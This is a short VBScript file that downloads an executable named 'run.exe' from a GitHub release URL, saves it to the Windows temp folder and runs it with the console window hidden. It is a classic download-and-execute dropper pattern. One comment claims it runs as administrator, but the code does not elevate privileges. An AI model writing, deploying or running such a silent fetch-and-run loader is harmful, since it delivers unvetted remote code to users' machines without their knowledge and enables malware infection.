Option Explicit

Dim objShell, objFSO, strURL, strFilePath, strCmd

' Initialize objects
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' URL of the file to download
strURL = "https://github.com/Y-GM/RPG/releases/download/pop1/run.exe"

' Get the temp folder path
Dim tempFolder
tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")

' Define the path where the file will be downloaded
strFilePath = tempFolder & "\run.exe"

' Download the file
Dim xmlHttp
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xmlHttp.Open "GET", strURL, False
xmlHttp.Send

If xmlHttp.Status = 200 Then
    ' Save the file to the temp folder
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1 ' Binary
    stream.Write xmlHttp.ResponseBody
    stream.Position = 0
    If objFSO.FileExists(strFilePath) Then objFSO.DeleteFile strFilePath
    stream.SaveToFile strFilePath
    stream.Close
    Set stream = Nothing
Else
    WScript.Echo "Failed to download the file. HTTP Status: " & xmlHttp.Status
    WScript.Quit
End If

Set xmlHttp = Nothing

' Command to execute the downloaded file
strCmd = "cmd.exe /c " & strFilePath

' Run the command as administrator and hide the console window
objShell.Run strCmd, 0, True

' Clean up
Set objShell = Nothing
Set objFSO = Nothing
